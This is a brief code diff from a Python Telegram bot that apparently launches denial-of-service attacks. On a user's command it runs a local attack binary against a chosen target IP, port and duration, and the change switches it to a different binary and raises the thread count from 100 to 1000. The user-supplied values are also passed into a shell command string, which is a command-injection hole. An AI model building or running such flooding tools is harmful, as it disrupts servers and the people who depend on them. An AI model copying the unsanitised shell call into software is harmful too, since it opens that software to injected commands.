@@ -106,7 +106,7 @@ def handle_bgmi(message):
                 last_attack_time[user_id] = current_time
 
                 bot.reply_to(message, f"Attack started on {target}:{port} for {duration} seconds.")
-                subprocess.run(f"./S4 {target} {port} {duration} 100 ", shell=True)
+                subprocess.run(f"./S42 {target} {port} {duration} 1000", shell=True)
 
                 bot.reply_to(message, "Attack completed successfully!")
 
